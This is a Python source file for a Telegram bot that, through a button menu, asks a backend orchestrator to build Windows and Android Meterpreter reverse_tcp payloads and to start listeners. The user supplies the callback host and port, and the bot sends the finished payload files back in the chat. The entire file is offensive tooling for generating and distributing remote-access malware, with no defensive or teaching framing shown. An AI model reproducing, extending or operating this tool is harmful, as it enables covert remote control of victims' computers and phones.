import asyncio
import json
import os
import logging
from dataclasses import dataclass
from typing import Dict, Any, Optional

import httpx
from dotenv import load_dotenv
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

load_dotenv()

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

ORCH_URL = os.environ.get("ORCH_URL", "http://127.0.0.1:8000")
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("TELEGRAM_OWNER_ID", "0"))

MENU, PARAMS = range(2)

@dataclass
class Session:
    kind: Optional[str] = None
    params: Dict[str, str] = None
    task_id: Optional[str] = None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
        if update.message:
            await update.message.reply_text("Access denied.")
        elif update.callback_query:
            await update.callback_query.answer("Access denied.", show_alert=True)
        return ConversationHandler.END
    kb = [
        [InlineKeyboardButton("Windows Payload", callback_data="kind:payload")],
        [InlineKeyboardButton("Listener", callback_data="kind:listener")],
        [InlineKeyboardButton("Android APK", callback_data="kind:android")],
    ]
    if update.message:
        await update.message.reply_text("Select task type:", reply_markup=InlineKeyboardMarkup(kb))
    else:
        await update.callback_query.edit_message_text("Select task type:", reply_markup=InlineKeyboardMarkup(kb))
    context.user_data["session"] = Session(kind=None, params={})
    return MENU


async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "back":
        return await start(update, context)
    if not data.startswith("kind:"):
        return MENU
    kind = data.split(":", 1)[1]
    sess: Session = context.user_data.get("session")
    sess.kind = kind
    sess.params = {}
    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back")]])
    if kind == "payload":
        await query.edit_message_text("Send parameters as: lhost lport output_name (payload fixed)", reply_markup=back_kb)
    elif kind == "listener":
        await query.edit_message_text("Send parameters as: lhost lport", reply_markup=back_kb)
    elif kind == "android":
        await query.edit_message_text("Send parameters as: lhost lport (APK sample will be used)", reply_markup=back_kb)
    else:
        await query.edit_message_text("Unsupported kind")
        return ConversationHandler.END
    return PARAMS


async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sess: Session = context.user_data.get("session")
    if not sess or not sess.kind:
        await update.message.reply_text("No session. Use /start")
        return ConversationHandler.END
    parts = update.message.text.strip().split()
    if sess.kind == "payload":
        if len(parts) < 3:
            await update.message.reply_text("Usage: lhost lport output_name")
            return PARAMS
        lhost, lport, output_name = parts[:3]
        payload = "windows/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
    elif sess.kind == "listener":
        if len(parts) < 2:
            await update.message.reply_text("Usage: lhost lport")
            return PARAMS
        lhost, lport = parts[:2]
        payload = "windows/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
    elif sess.kind == "android":
        if len(parts) < 2:
            await update.message.reply_text("Usage: lhost lport")
            return PARAMS
        lhost, lport = parts[:2]
        payload = "android/meterpreter/reverse_tcp"
        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
    else:
        await update.message.reply_text("Unsupported kind")
        return ConversationHandler.END

    # create task
    async with httpx.AsyncClient(timeout=600) as client:
        resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": sess.kind, "params": sess.params})
        resp.raise_for_status()
        data = resp.json()
        task = data["task"]
        sess.task_id = task["id"]
    await update.message.reply_text(f"Task created: {sess.task_id}. Polling…")
    await poll_and_send(update, context, sess)
    return ConversationHandler.END


async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess: Session):
    chat_id = update.effective_chat.id
    async with httpx.AsyncClient(timeout=600) as client:
        for _ in range(60):
            r = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}")
            r.raise_for_status()
            task = r.json()["task"]
            state = task["state"]
            await context.bot.send_message(chat_id, f"State: {state}")
            if state in ("SUCCEEDED", "FAILED", "CANCELLED"):
                if state == "SUCCEEDED":
                    arts = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}/artifacts")
                    arts.raise_for_status()
                    artifacts = arts.json()
                    if artifacts:
                        for a in artifacts:
                            p = a["path"]
                            name = a["name"]
                            try:
                                # send as document
                                with open(p, "rb") as f:
                                    await context.bot.send_document(chat_id, document=InputFile(f, filename=name))
                            except Exception as e:
                                await context.bot.send_message(chat_id, f"Failed to send {name}: {e}")
                else:
                    await context.bot.send_message(chat_id, f"Error: {task.get('error')}")
                return
            await asyncio.sleep(2)
    await context.bot.send_message(chat_id, "Timeout waiting for task")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Access denied.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /cancel <task_id>")
        return
    task_id = context.args[0]
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.post(f"{ORCH_URL}/tasks/{task_id}/cancel")
        if r.status_code == 200:
            await update.message.reply_text(f"Cancelled: {task_id}")
        else:
            await update.message.reply_text(f"Failed to cancel: {r.text}")


def main():
    token = BOT_TOKEN
    if not token:
        print("Please set TELEGRAM_BOT_TOKEN in environment.")
        return
    application = Application.builder().token(token).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start), CommandHandler("menu", start)],
        states={
            MENU: [CallbackQueryHandler(menu_handler)],
            PARAMS: [
                MessageHandler(filters.TEXT & (~filters.COMMAND), params_handler),
                CommandHandler("start", start),
                CommandHandler("menu", start),
                CallbackQueryHandler(menu_handler),
            ],
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("menu", start)],
        per_message=False,
        per_user=True,
        per_chat=True,
    )
    application.add_handler(conv)
    application.add_handler(CommandHandler("cancel", cancel))
    logger.info("Starting polling...")
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Exception as e:
        logger.exception("Bot crashed: %s", e)


if __name__ == "__main__":
    main()